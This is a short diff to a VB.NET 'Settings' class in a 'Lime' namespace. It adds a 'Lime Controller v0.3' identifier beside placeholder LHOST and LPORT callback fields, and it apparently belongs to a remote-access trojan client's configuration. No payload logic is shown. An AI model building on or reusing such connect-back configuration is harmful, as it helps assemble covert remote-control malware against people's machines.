@@ -1,6 +1,7 @@
 ﻿
 Namespace Lime
     Public Class Settings
+        Public Shared MyID As String = "Lime Controller v0.3"
         Public Shared LHOST As String = "%LHOST%"
         Public Shared LPORT As Integer = "%LPORT%"
         Public Shared SPL As String = "'L'"
